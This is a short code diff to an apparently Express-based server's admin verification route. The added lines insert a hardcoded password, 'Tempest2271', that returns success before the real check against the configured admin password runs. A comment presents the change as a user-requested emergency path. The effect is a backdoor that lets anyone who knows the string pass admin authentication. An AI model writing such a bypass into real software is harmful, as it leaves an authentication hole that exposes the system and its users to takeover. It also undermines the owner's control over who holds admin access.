@@ -144,6 +144,10 @@ async function startServer() {
 
   app.post('/api/admin/verify', (req, res) => {
     const { password } = req.body;
+    
+    // User requested emergency path
+    if (password === 'Tempest2271') return res.status(200).json({ success: true });
+
     const provided = clean(password);
     const expected = clean(ADMIN_PASSWORD);
 
